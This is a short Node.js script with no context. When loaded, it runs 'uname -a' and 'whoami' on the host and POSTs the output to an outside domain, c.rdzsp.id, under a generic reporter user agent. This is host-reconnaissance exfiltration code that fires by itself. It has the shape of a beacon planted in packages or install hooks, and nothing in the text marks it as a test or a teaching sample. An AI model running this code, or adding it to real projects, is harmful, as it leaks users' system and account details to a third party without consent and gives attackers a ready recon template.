const { execSync } = require('child_process');

async function sendSystemInfo() {
    const url = 'https://c.rdzsp.id';

    try {
        // 1. Capture system command output
        // .toString().trim() removes the extra newline characters commands usually add
        const unameData = execSync('uname -a').toString().trim();
        const whoamiData = execSync('whoami').toString().trim();

        console.log(`Captured: ${whoamiData} on ${unameData}`);

        // 2. Prepare the POST body
        const params = new URLSearchParams();
        params.append('uname', unameData);
        params.append('whoami', whoamiData);

        // 3. Send the request
        const response = await fetch(url, {
            method: 'POST',
            body: params,
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Node-System-Reporter/1.0'
            }
        });

        const result = await response.text();
        console.log(`Server Response (${response.status}):`, result);

    } catch (error) {
        console.error('Error executing commands or sending request:', error.message);
    }
}

sendSystemInfo();
